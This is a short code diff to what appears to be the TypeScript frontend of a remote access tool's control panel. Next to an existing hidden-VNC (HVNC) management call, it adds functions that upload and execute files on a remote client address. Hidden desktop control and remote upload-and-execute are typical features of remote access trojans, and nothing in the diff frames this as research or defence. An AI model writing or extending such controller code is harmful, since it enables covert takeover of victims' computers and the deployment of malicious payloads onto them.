@@ -245,3 +245,17 @@ export const manageHVNC = async (
 ): Promise<void> => {
   return invoke("manage_hvnc", { addr, run });
 };
+
+export const uploadAndExecute = async (
+  addr: string | undefined,
+  filePath: string
+): Promise<void> => {
+  return invoke("upload_and_execute", { addr, filePath });
+};
+
+export const executeFile = async (
+  addr: string | undefined,
+  filePath: string
+): Promise<void> => {
+  return invoke("execute_file", { addr, filePath });
+};
